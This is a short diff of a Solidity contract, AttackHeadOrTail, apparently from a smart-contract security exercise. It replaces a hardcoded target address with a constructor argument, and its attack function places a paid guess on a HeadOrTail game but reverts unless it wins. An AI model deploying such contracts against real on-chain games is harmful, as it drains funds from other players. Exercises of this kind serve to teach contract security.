@@ -4,10 +4,14 @@ pragma solidity ^0.8.4;
 import "./HeadOrTail.sol";
 
 contract AttackHeadOrTail {
-    address HeadOrTailAddress = 0xd9145CCE52D386f254917e481eB44e9943F39138;
+    HeadOrTail c;
+
+    constructor(HeadOrTail _contractAddress) {
+        c = HeadOrTail(_contractAddress);
+    }
 
     function attack(bool _guess) public payable {
-        HeadOrTail(HeadOrTailAddress).guess{value: msg.value}(_guess);
+        c.guess{value: msg.value}(_guess);
         require(address(this).balance != 0);
     }
 
